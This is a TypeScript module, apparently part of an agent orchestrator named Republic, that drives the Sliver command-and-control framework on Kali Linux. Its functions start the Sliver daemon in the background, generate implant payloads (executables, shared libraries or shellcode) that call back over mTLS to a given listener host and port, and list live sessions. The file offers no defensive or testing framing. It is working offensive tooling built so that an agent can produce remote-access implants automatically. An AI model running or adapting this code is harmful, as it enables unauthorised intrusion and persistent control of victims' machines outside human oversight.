/**
 * Kali Linux C2 Orchestration Bridge (Sliver)
 *
 * Exposes the open-source Sliver C2 framework to the Republic orchestrator,
 * enabling the agent to spawn listener daemons, generate fileless implants,
 * and track live beaconing sessions automatically.
 */

import { kaliExec } from "./kali-agent-loop.js";

export interface C2Result {
  ok: boolean;
  output: string;
  exitCode: number;
}

/**
 * Starts the Sliver C2 daemon in the background if it's not already running.
 */
export async function sliverStartDaemon(): Promise<C2Result> {
  // Check if systemd/sliver is running, or start sliver-server in background
  const checkCmd = `pgrep sliver-server`;
  const checkResult = await kaliExec(checkCmd, 10);
  
  if (checkResult.stdout.trim() !== "") {
    return { ok: true, output: "Sliver daemon is already running.", exitCode: 0 };
  }

  // Start the daemon in the background
  const startCmd = `nohup sliver-server daemon > /tmp/sliver.log 2>&1 &`;
  const result = await kaliExec(startCmd, 10);

  // Give it a moment to boot
  await kaliExec(`sleep 3`, 10);

  return {
    ok: result.ok,
    output: "Started Sliver daemon.",
    exitCode: result.exitCode,
  };
}

/**
 * Generates an implant payload utilizing the Sliver C2 CLI.
 * @param os Target OS (linux, windows, mac)
 * @param arch Target architecture (amd64, 386, arm64)
 * @param lhost Listener IP
 * @param lport Listener port
 * @param format Output format (exe, shared, shellcode)
 */
export async function sliverGenerateImplant(
  os: string,
  arch: string,
  lhost: string,
  lport: string,
  format: string = "exe"
): Promise<{ ok: boolean; path?: string; output: string }> {
  // Secure params
  const safeOs = os.replace(/[^a-z]/g, "");
  const safeArch = arch.replace(/[^a-z0-9]/g, "");
  const safeLhost = lhost.replace(/[^a-zA-Z0-9.-]/g, "");
  const safeLport = lport.replace(/[^0-9]/g, "");
  const safeFormat = format.replace(/[^a-z]/g, "");
  
  const savePath = `/tmp/implant_${Date.now()}.${safeFormat === 'exe' ? 'exe' : 'bin'}`;

  // sliver (client) calls the daemon
  // Note: we use sliver in script mode to generate payloads
  const cmd = `sliver -e "generate --mtls ${safeLhost}:${safeLport} --os ${safeOs} --arch ${safeArch} --format ${safeFormat} --save ${savePath}"`;
  
  const result = await kaliExec(cmd, 120); // compilation takes time

  if (result.ok) {
    return { ok: true, path: savePath, output: result.stdout || result.stderr || "" };
  } else {
    return { ok: false, output: result.stdout || result.stderr || "Generation failed" };
  }
}

/**
 * Lists active C2 sessions reporting back to the Sliver daemon.
 */
export async function sliverListSessions(): Promise<C2Result> {
  const cmd = `sliver -e "sessions"`;
  const result = await kaliExec(cmd, 20);

  return {
    ok: result.ok,
    output: result.stdout || result.stderr || "",
    exitCode: result.exitCode,
  };
}
